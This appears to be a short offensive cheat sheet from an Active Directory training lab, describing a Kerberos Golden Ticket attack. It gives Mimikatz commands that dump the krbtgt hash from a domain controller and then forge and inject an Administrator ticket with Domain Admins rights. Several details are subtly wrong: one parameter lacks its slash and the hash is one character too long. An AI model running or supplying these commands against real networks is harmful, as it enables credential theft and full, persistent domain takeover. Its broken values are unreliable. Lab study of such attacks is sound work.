# Golden Ticket

# Execute mimikatz on DC as DA to get krbtgt hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc

# On any machine
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff47a9d8bd66ce7efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
